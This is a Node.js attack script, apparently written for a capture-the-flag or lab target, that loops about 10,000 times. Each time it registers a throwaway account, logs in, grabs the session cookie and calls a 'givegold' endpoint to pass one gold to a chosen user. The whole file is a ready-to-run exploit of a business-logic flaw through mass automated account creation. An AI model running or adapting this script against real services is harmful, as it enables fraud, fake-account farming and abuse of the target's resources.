const request = require('request');

// Options

let user = 'USERNAME'; // User to send the gold too, should be already registered
let pass = 'PASSWORD'; // Password you want the users to have
let host = 'HOST'; // Your machine ip
let sCode; // Leave that empty

let cookies; // Leave that blank

let gold = 10100; // How much gold to add

for(let i=1; i<gold; i++) {

    let rdata = `username=teddd${i}&password=${pass}&password2=${pass}`; // Register data
    let ldata = `username=teddd${i}&password=${pass}`; // Login data
    let sdata = `user=${user}&amount=1`; // Send-Gold data

    if(i<2000) {
        setTimeout(() => {
            request.post({
                headers: {'content-type' : 'application/x-www-form-urlencoded'},
                url: `http://${host}/api/create`,
                body: rdata
            }, (err, response, body) => {
                request.post({
                    headers: {'content-type' : 'application/x-www-form-urlencoded'},
                    url: `http://${host}/api/login`,
                    body: ldata
                }, (err, res, body) => {      
                    if(!res) return;
                    cookies = res.headers['set-cookie'];
                    if(cookies === undefined) return;
                    request.post({
                        headers: {
                            'content-type': 'application/x-www-form-urlencoded',
                            'Cookie': `${cookies}`,
                        },
                    url: `http://${host}/api/givegold`,
                    body: sdata,
                    }, (err, resp, body) => {
                        if(body) console.log(i);
                    });
                });
            });
        }, i * 200);
    } else {
        setTimeout(() => {
            request.post({
                headers: {'content-type' : 'application/x-www-form-urlencoded'},
                url: `http://${host}/api/create`,
                body: rdata
            }, (err, response, body) => {
                request.post({
                    headers: {'content-type' : 'application/x-www-form-urlencoded'},
                    url: `http://${host}/api/login`,
                    body: ldata
                }, (err, res, body) => {      
                    if(!res) return;
                    cookies = res.headers['set-cookie'];
                    if(cookies === undefined) return;
                    request.post({
                        headers: {
                            'content-type': 'application/x-www-form-urlencoded',
                            'Cookie': `${cookies}`,
                        },
                    url: `http://${host}/api/givegold`,
                    body: sdata,
                    }, (err, resp, body) => {
                        if(body) console.log(i);
                    });
                });
            });
        }, i * 200);
    };
};
